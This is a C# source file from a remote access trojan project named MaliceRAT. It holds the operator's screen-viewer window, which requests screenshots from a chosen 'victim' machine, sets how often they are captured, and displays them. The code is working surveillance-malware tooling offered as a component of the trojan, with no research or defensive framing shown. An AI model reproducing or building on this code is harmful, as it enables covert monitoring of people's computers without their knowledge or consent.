using System;
using System.Drawing;
using System.Windows.Forms;
using MaliceRAT.RatServer;

namespace MaliceRAT.RatUI
{
    public partial class ScreenViewForm : Form
    {
        private int victimId;
        private Server server;

        public ScreenViewForm(int victimId, Server server)
        {
            InitializeComponent();
            this.victimId = victimId;
            this.server = server;
            
            server.screenViewer.ScreenshotReceived += UpdateScreenImage;

            titleLabel.Text = $"Screen viewer [{server.GetVictimById(victimId).User}]";

            int halfScreenWidth = Screen.PrimaryScreen.WorkingArea.Width / 2;
            int halfScreenHeight = Screen.PrimaryScreen.WorkingArea.Height / 2;

            this.MaximumSize = new Size(halfScreenWidth, halfScreenHeight);

            pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
            pictureBox.Dock = DockStyle.Fill;
        }

        private void StopButton_Click(object sender, EventArgs e)
        {
            server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(victimId), 0);
        }

        private void ScreenViewForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(victimId), 0);
        }

        private void UpdateButton_Click(object sender, EventArgs e)
        {
            server.screenViewer.RequestScreenshot(server.GetVictimById(victimId));
        }

        private void UpdateIntervalButton_Click(object sender, EventArgs e)
        {
            if (int.TryParse(intervalTextBox.Text, out int interval))
            {
                server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(victimId), interval);
            }
            else
            {
                MessageBox.Show("Please enter a valid number for the interval.");
            }
        }

        public void UpdateScreenImage(byte[] imageData)
        {
            using (var ms = new System.IO.MemoryStream(imageData))
            {
                Image image = Image.FromStream(ms);
                pictureBox.Image = image;
            }
        }
    }
}